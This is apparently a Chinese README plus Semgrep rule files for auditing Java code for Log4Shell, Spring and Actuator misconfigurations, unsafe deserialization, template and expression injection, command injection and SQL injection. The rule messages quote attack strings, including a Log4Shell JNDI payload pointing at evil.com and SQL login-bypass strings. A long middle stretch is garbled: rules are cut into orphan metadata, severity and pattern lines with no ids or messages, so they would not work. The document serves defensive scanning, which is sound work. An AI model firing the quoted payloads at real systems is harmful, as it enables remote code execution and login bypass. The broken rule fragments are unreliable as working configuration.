# semgrep

Semgrep Rules for Java Security Audit

## 中文说明

Semgrep 是 Claude Code 的能力扩展，用来处理对应领域里的文件、网页、数据或自动化流程。

## 典型场景
- 使用 Semgrep 完成相关任务
- 减少手工复制、整理和重复操作
- 把固定流程交给 Claude Code 执行

# Semgrep Rules for Java Security Audit

本目录包含 Java 代码安全审计的 Semgrep 规则，对应 Java Audit Skill 的 Phase 4 输出。

**规则来源参考**：
- [Oracle - Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) - 官方权威安全编码指南
- [JavaSec - Java Web 安全知识库](https://www.javasec.org/) - 文件访问、文件上传、XSS、反序列化、Fastjson 等
- [Y4tacker/JavaSec](https://github.com/Y4tacker/JavaSec) - CC/CB链、内存马、Struts2、JDBC Attack
- [helloexp/0day](https://github.com/helloexp/0day) - Java专区漏洞POC
- [腾讯 SecGuide 安全开发规范](https://github.com/Tencent/secguide) - Java/JavaScript 安全编码规范
- Spring Boot Actuator 官方文档 - 端点安全配置
- Apache Shiro 安全公告 - CVE-2016-4437 密钥硬编码
- [OWASP Java 安全指南](https://owasp.org/www-project-java/)
- Semgrep 官方规则库

## 使用方法

### 安装 Semgrep

```bash
# macOS
brew install semgrep

# Linux
pip install semgrep

# 或使用 Docker
docker pull returntocorp/semgrep
```

### 扫描项目

```bash
# 扫描单个规则文件
semgrep --config rules/semgrep/java-rce.yaml /path/to/project

# 扫描所有规则
semgrep --config rules/semgrep/ /path/to/project

# 输出 JSON 格式
semgrep --config rules/semgrep/ --json /path/to/project > results.json

# 仅显示 ERROR 级别
semgrep --config rules/semgrep/ --severity ERROR /path/to/project

# 输出 SARIF 格式 (用于 GitHub Code Scanning)
semgrep --config rules/semgrep/ --sarif /path/to/project > results.sarif
```

### CI/CD 集成

```yaml
# GitHub Actions 示例
name: Security Audit
on: [push, pull_request]

jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/secrets
            ./rules/semgrep/
```

## 规则优先级

| 严重程度 | 说明 | 响应时效 |
|----------|------|----------|
| ERROR | 确认存在漏洞，需立即修复 | 24h 内 |
| WARNING | 疑似漏洞或潜在风险，需人工确认 | 7 天内 |

## 自定义规则

添加新规则到对应文件中：

```yaml
rules:
  - id: your-rule-id
    patterns:
      - pattern: 危险模式
      - pattern-not: 安全模式
    message: 规则描述
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-XXX"
```

## 误报处理

如果规则产生误报，可以：

1. **在代码中添加注释**:
```java
// nosemgrep: java-weak-hash-md5
MessageDigest md = MessageDigest.getInstance("MD5"); // 用于非安全场景
```

2. **修改规则添加更多排除条件**

3. **调整规则严重程度**

rules:
  # ============================================
  # P0 - 组件配置安全 - Log4j2
  # ============================================
  
  - id: java-config-log4j2-jndi-lookup
    patterns:
      - pattern-regex: '\$\{jndi:'
    paths:
      include:
        - "*.xml"
        - "*.properties"
        - "*.yml"
        - "*.yaml"
        - "*.java"
    message: "检测到 Log4j2 JNDI lookup 表达式。CVE-2021-44228 (Log4Shell)：攻击者可通过 ${jndi:ldap://evil.com/exp} 触发远程代码执行。建议升级 Log4j2 到 2.17.1+ 或设置 formatMsgNoLookups=true"
    severity: ERROR
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://logging.apache.org/log4j/2.x/security.html

  - id: java-config-log4j2-message-lookup
    patterns:
      - pattern-regex: '\$\{[a-z]+:'
    paths:
      include:
        - "*.xml"
        - "*.properties"
        - "*.java"
    message: "检测到 Log4j2 lookup 表达式。Log4j2 支持 ${ctx:}, ${env:}, ${sys:} 等 lookup，可能导致信息泄露或 RCE。建议升级到 2.17.1+ 或禁用 lookup。"
    severity: WARNING
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-config-log4j2-version-vulnerable
    patterns:
      - pattern-regex: 'log4j[^>]*<version>\s*2\.(0|1[0-4])\.|log4j-version>\s*2\.(0|1[0-4])\.'
    paths:
      include:
        - "pom.xml"
        - "*.gradle"
    message: "检测到 Log4j2 受影响版本 (< 2.15.0)。CVE-2021-44228 (Log4Shell)：远程代码执行漏洞。建议升级到 2.17.1+。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-502"

  # ============================================
  # P1 - 组件配置安全 - Spring Security
  # ============================================
  
  - id: java-config-springsecurity-antMatchers-bypass
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*(permitAll|authenticated|hasRole)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security antMatchers 配置。antMatchers(\"/test\") 可被 /test/ (带斜杠) 绕过，因 Spring WebMVC 的 useTrailingSlashMatch 默认为 true。建议使用 mvcMatchers 或配置 useTrailingSlashMatch=false。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-287"

  - id: java-config-springsecurity-csrf-disabled
    patterns:
      - pattern-regex: 'csrf\s*\(\s*\)\s*\.\s*disable|csrf\(\)\.disable\(\)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security CSRF 保护已禁用。CSRF 保护可防止跨站请求伪造攻击。建议仅对无状态 API 禁用 CSRF。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-352"

  - id: java-config-springsecurity-permitAll-abuse
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*permitAll|requestMatchers\s*\([^)]+\)\s*\.\s*permitAll'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security permitAll 配置。permitAll 允许匿名访问，请确认是否为公开资源。敏感接口应使用 authenticated() 或 hasRole()。"
    severity: INFO
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-284"

  - id: java-config-springsecurity-doublestar-bypass
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"\*\*"\s*\)|requestMatchers\s*\(\s*"\*\*"\s*\)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security 使用 ** 通配符。CVE-2023-34034：双星号匹配可能导致认证绕过。建议使用 /** 或更精确的路径匹配。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-287"
      references:
        - https://spring.io/security/cve-2023-34034

  - id: java-config-springsecurity-frame-options-disabled
    patterns:
      - pattern-regex: 'headers\s*\(\s*\)\s*\.\s*frameOptions\s*\(\s*\)\s*\.\s*disable'
    paths:
      include:
        - "*.java"
    message: "检测到 X-Frame-Options 已禁用。禁用后页面可被 iframe 嵌入，可能导致点击劫持攻击。建议保持默认 DENY 或 SAMEORIGIN。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-1021"

  - id: java-config-springsecurity-session-fixation
    patterns:
      - pattern-regex: 'sessionFixation\s*\(\s*\)\s*\.\s*none'
    paths:
      include:
        - "*.java"
    message: "检测到 Session 固定防护已禁用。攻击者可利用 Session 固定攻击劫持用户会话。建议使用 sessionFixation().migrateSession() 或 newSession()。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-384"

  # ============================================
  # P1 - 组件配置安全 - Spring Boot
  # ============================================
  
  - id: java-config-actuator-expose-all
    patterns:
      - pattern-regex: 'management\.endpoints\.web\.exposure\.include\s*[=:]\s*\*|exposure\.include\s*[=:]\s*\*'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring Boot Actuator 暴露所有端点。默认端点包括：heapdump(内存dump)、env(环境变量)、configprops(配置)、mappings(路由) 等敏感信息。建议仅暴露必要端点：management.endpoints.web.exposure.include=health,info"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"
      references:
        - https://docs.spring.io/spring-boot/reference/actuator/index.html

  - id: java-config-actuator-unrestricted
    patterns:
      - pattern-regex: 'management\.endpoint\.[a-z]+\.access\s*[=:]\s*unrestricted'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Actuator 端点设置为 unrestricted。除 shutdown/heapdump 外，其他端点默认 unrestricted。建议使用 management.endpoints.access.default=none 控制全局权限。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-devtools-enabled
    patterns:
      - pattern-regex: 'spring\.devtools\.(restart|livereload)\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring DevTools 开启。生产环境应禁用 DevTools，可能导致远程代码执行。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-management-port-same
    patterns:
      - pattern-regex: 'management\.server\.port\s*[=:]\s*\$\{server\.port\}|management\.server\.port\s*[=:]\s*8080'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到管理端口与应用端口相同。建议使用独立端口：management.server.port=8081，并配置防火墙限制访问。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-banner-enabled
    patterns:
      - pattern-regex: 'spring\.main\.banner-mode\s*[=:]\s*(console|log)'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring Banner 开启。生产环境应禁用 Banner，可能泄露 Spring 版本信息。建议设置 spring.main.banner-mode=off。"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-200"

  # ============================================
  # P0 - 组件配置安全 - Shiro
  # ============================================
  
  - id: java-config-shiro-default-key
    patterns:

    metadata:
      category: security

    languages: [java]

      category: security

    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-209"

  - id: java-sensitive-exception-message
    patterns:
      - pattern: return $E.getMessage()

    severity: WARNING
    languages: [java]
    metadata:
      category: security

    languages: [java]

    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-284"

    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-798"

      category: security

      category: security

    patterns:

    severity: INFO
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-384"

      category: security

    metadata:
      category: security

    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  # ============================================
  
  - id: java-api-cors-wildcard
    patterns:
      - pattern-regex: 'allowedOrigins\s*[=:]\s*"\*"|@CrossOrigin\(origins\s*=\s*"\*"\)'

      include:
        - "*.java"
        - "*.yml"
        - "*.yaml"
    message: "检测到 CORS 允许所有来源，可能导致跨站请求伪造。建议限制允许的域名。"

    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-942"

    patterns:
      - pattern-regex: 'allowCredentials\s*[=:]\s*true'

        - "*.java"

        - "*.yaml"

    severity: WARNING
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-942"

    languages: [generic]

      category: security

    languages: [java]
    metadata:

    metadata:

      category: security

      include:

        - "*.yaml"
        - "*.properties"
        - "*.java"

    severity: WARNING
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-918"

    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"

    languages: [java]

      category: security

    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"

    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-1333"

    patterns:
      - pattern-regex: 'while\s*\(\s*true\s*\)|for\s*\(\s*;\s*;\s*\)'

    languages: [java]
    metadata:
      category: security
      cwe: "CWE-400"

    languages: [java]
    metadata:
      category: security

rules:
  # ============================================

  # ============================================

    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-unsafe-deserialization-xmldecoder
    patterns:
      - pattern: new XMLDecoder($INPUT)
    message: "检测到 XMLDecoder 使用，存在 XML 反序列化漏洞，可直接导致 RCE。建议使用安全的 XML 解析器。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-xstream-deserialization
    patterns:
      - pattern: new XStream()
    message: "检测到 XStream 反序列化，存在 RCE 风险。XStream 存在多个 CVE，建议配置白名单或使用安全初始化。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://x-stream.github.io/security.html

  - id: java-xstream-allow-types
    patterns:
      - pattern: $XS.allowTypes(...)
    message: "检测到 XStream allowTypes 配置。请确保白名单不包含危险类。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-fastjson-autotype-enabled
    patterns:
      - pattern: ParserConfig.getGlobalInstance().setAutoTypeSupport(true)
    message: "检测到 Fastjson autoType 开启，存在反序列化 RCE 风险。强烈建议启用 safeMode 或升级到 1.2.83+。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://github.com/alibaba/fastjson/wiki/security_update_20170315

  - id: java-fastjson-parse
    patterns:
      - pattern-either:
        - pattern: JSON.parseObject($INPUT)
        - pattern: JSON.parse($INPUT)
        - pattern: JSON.parseArray($INPUT)
    message: "检测到 Fastjson 解析方法。请确认版本是否安全（推荐 1.2.83+）且 autoType 已禁用。历史漏洞版本：1.2.24/1.2.25-47/1.2.68 等。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://github.com/alibaba/fastjson/wiki/security_update_20170315

  - id: java-fastjson-autotype-config
    patterns:
      - pattern-either:
        - pattern: ParserConfig.getGlobalInstance().setAutoTypeSupport(true)
        - pattern: ParserConfig.getGlobalInstance().addAccept(...)
    message: "检测到 Fastjson AutoType 配置。开启 AutoType 存在反序列化 RCE 风险。建议使用 safeMode：ParserConfig.getGlobalInstance().setSafeMode(true)"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-jackson-defaultTyping
    patterns:
      - pattern-either:
        - pattern: $OM.enableDefaultTyping()
        - pattern: $OM.activateDefaultTyping(...)
    message: "检测到 Jackson 多态类型处理开启，可能导致反序列化漏洞。建议使用白名单 PolymorphicTypeValidator。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-hessian-deserialization
    patterns:
      - pattern-either:
        - pattern: new HessianInput($INPUT)
        - pattern: new Hessian2Input($INPUT)
    message: "检测到 Hessian 反序列化，存在 RCE 风险。参考：hessian-only-jdk 利用链可无需第三方依赖。建议升级版本并配置白名单 ObjectDeserializer。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://su18.org/post/hessian/

  - id: java-snakeyaml-unsafe
    patterns:
      - pattern-either:
        - pattern: new Yaml()
        - pattern: new Yaml($CONSTRUCTOR)
    message: "检测到 SnakeYAML 使用，存在反序列化漏洞风险。历史漏洞版本：<1.31。建议使用 SafeConstructor：new Yaml(new SafeConstructor())"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/

  # ============================================
  # P0 - SSTI 模板注入 (Server-Side Template Injection)
  # ============================================
  
  - id: java-velocity-ssti
    patterns:

      - pattern-not: Velocity.evaluate($CONTEXT, $WRITER, $LOGNAME, "...")

    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"
      references:
        - https://portswigger.net/web-security/server-side-template-injection

  - id: java-freemarker-ssti
    patterns:
      - pattern: new Template($NAME, $CONTENT, $CFG)
      - pattern-not: new Template($NAME, "...", $CFG)
    message: "检测到用户可控的 FreeMarker 模板内容，存在 SSTI 风险。请禁用 new() 内置指令。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"

  - id: java-thymeleaf-ssti
    patterns:
      - pattern: $ENGINE.process($TEMPLATE, $CONTEXT)
      - pattern-not: $ENGINE.process("...", $CONTEXT)
    message: "检测到 Thymeleaf 模板处理。请验证模板名称是否来自用户输入，可能存在 SSTI 风险。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"

  # ============================================
  # P0 - 表达式注入 (Expression Injection)
  # ============================================
  
  - id: java-spel-injection
    patterns:
      - pattern: $PARSER.parseExpression($EXPR)
      - pattern-not: $PARSER.parseExpression("...")
    message: "检测到用户可控的 SpEL 表达式，存在表达式注入风险，可直接导致 RCE。建议使用 SimpleEvaluationContext。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-917"
      references:
        - https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions

  - id: java-ognl-injection
    patterns:
      - pattern-either:
        - pattern: Ognl.getValue($EXPR, $ROOT)
        - pattern: Ognl.setValue($EXPR, $ROOT, $VALUE)
        - pattern: Ognl.parseExpression($EXPR)
    message: "检测到 OGNL 表达式使用，存在表达式注入风险。Struts2 历史漏洞多与此相关。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-917"

  - id: java-mvel-injection
    patterns:
      - pattern-either:
        - pattern: MVEL.eval($EXPR)
        - pattern: MVEL.executeExpression($EXPR)
    message: "检测到 MVEL 表达式执行，存在 RCE 风险。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-917"

    patterns:

    languages: [java]
    metadata:
      category: security
      cwe: "CWE-917"
      references:

  # ============================================
  
  - id: java-command-injection-runtime-exec
    patterns:
      - pattern: Runtime.getRuntime().exec($CMD)
      - pattern-not: Runtime.getRuntime().exec("...")
    message: "检测到 Runtime.exec() 使用用户可控参数，存在命令注入风险。建议使用 ProcessBuilder + 参数数组。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-78"
      owasp: "A1:2017 Injection"

  - id: java-command-injection-processbuilder
    patterns:
      - pattern: new ProcessBuilder($CMD)
      - pattern-not: |
          new ProcessBuilder("...")
    message: "检测到 ProcessBuilder 使用。请确保命令参数不可被用户控制，避免命令注入。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-78"

  - id: java-command-injection-processbuilder-list
    patterns:
      - pattern: new ProcessBuilder($LIST)
    message: "检测到 ProcessBuilder 使用 List 参数。请验证 List 中的命令是否来自用户输入。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-78"

  - id: java-script-engine-injection
    patterns:
      - pattern: $ENGINE.eval($SCRIPT)
      - pattern-not: $ENGINE.eval("...")

    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-94"

rules:
  # ============================================
  # P1 - SQL 注入 (SQL Injection)
  # ============================================
  
  - id: java-sqli-statement-execute
    patterns:
      - pattern-either:
        - pattern: $STMT.executeQuery($SQL)
        - pattern: $STMT.executeUpdate($SQL)
        - pattern: $STMT.execute($SQL)
      - pattern-not: $STMT.executeQuery("...")
      - pattern-not: $STMT.executeUpdate("...")
      - pattern-not: $STMT.execute("...")
    message: "检测到 Statement 执行动态 SQL，存在 SQL 注入风险。强烈建议使用 PreparedStatement。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"
      owasp: "A1:2017 Injection"

  - id: java-sqli-createstatement
    patterns:
      - pattern: $CONN.createStatement()
    message: "检测到 createStatement() 使用，可能存在 SQL 注入风险。建议使用 PreparedStatement。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-sqli-string-concat
    patterns:
      - pattern-regex: (executeQuery|executeUpdate|execute)\s*\(\s*[^"]*\+[^"]*\)
    message: "检测到 SQL 语句字符串拼接，存在 SQL 注入风险。建议使用参数绑定。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-sqli-jdbc-concat
    patterns:
      - pattern-regex: (select|insert|update|delete|SELECT|INSERT|UPDATE|DELETE).*\+\s*(username|password|id|name|user|param)
    message: "检测到 SQL 语句与用户输入拼接，存在 SQL 注入风险。万能密码绕过：'=0# 或 ' or '1'='1"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-mybatis-dollar-sign
    patterns:
      - pattern-regex: \$\{[^}]+\}
    paths:
      include:
        - "*.xml"
    message: "检测到 MyBatis ${} 占位符，直接拼接 SQL，存在注入风险。建议使用 #{} 参数绑定。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-89"
      references:
        - https://mybatis.org/mybatis-3/sqlmap-xml.html

  - id: java-jpa-native-query-concat
    patterns:
      - pattern: $EM.createNativeQuery($SQL + ...)
    message: "检测到 JPA 原生 SQL 拼接，存在 SQL 注入风险。建议使用参数绑定。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-jpa-native-query-string
    patterns:
      - pattern: $EM.createNativeQuery($VAR)
      - pattern-not: $EM.createNativeQuery("...")
    message: "检测到 JPA 原生 SQL 使用变量。请验证是否使用参数绑定而非字符串拼接。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-hql-injection
    patterns:
      - pattern: $EM.createQuery($HQL)
      - pattern-not: $EM.createQuery("...")
    message: "检测到 HQL 查询使用变量。请确保使用参数绑定（:param）而非字符串拼接。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-jdbc-template-concat
    patterns:
      - pattern-either:
        - pattern: $JDBCTEMPLATE.queryForObject($SQL + ...)
        - pattern: $JDBCTEMPLATE.query($SQL + ...)
        - pattern: $JDBCTEMPLATE.update($SQL + ...)
    message: "检测到 JdbcTemplate SQL 拼接，存在注入风险。建议使用 ? 占位符。"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-sqli-order-by
    patterns:
      - pattern-regex: (order\s+by|ORDER\s+BY)\s+[^"']*\+[^"']*
    message: "检测到 ORDER BY 动态排序字段，可能存在 SQL 注入。建议使用白名单验证排序字段。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"

  - id: java-sqli-in-clause
    patterns:
      - pattern-regex: (IN|in)\s*\([^)]*\+[^)]*\)
    message: "检测到 IN 子句动态拼接，存在 SQL 注入风险。建议使用 MyBatis foreach 或参数数组。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-89"
